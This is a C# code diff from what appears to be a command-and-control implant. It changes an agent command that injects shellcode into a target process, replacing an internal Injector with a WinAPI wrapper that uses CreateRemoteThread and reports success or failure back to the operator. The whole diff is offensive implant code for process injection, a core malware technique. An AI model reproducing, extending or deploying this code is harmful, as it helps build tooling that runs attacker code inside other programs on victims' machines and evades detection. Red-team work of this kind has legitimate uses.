@@ -1,5 +1,4 @@
-﻿using Agent.Internal;
-using Agent.Models;
+﻿using Agent.Models;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -8,6 +7,7 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using WinAPI.Wrapper;
 
 namespace Agent.Commands
 {
@@ -31,14 +31,17 @@ namespace Agent.Commands
                 return;
             }
 
-            var injectRes = Injector.Inject(process, shellcode);
-            if (!injectRes.Succeed)
-                context.Result.Result += $"Injection failed : {injectRes.Error}";
-            else
+            var winAPI = WinAPIWrapper.CreateInstance();
+
+            try
             {
-                context.Result.Result += $"Injection succeed!" + Environment.NewLine;
-                if (!string.IsNullOrEmpty(injectRes.Output))
-                    context.Result.Result += injectRes.Output;
+                winAPI.Inject(process.Handle, IntPtr.Zero, shellcode, InjectionMethod.CreateRemoteThread);
+                context.AppendResult($"Injection succeed!");
+            }
+            catch(Exception ex)
+            {
+                context.Error($"Injection failed : {ex}");
+                return;
             }
         }
     }
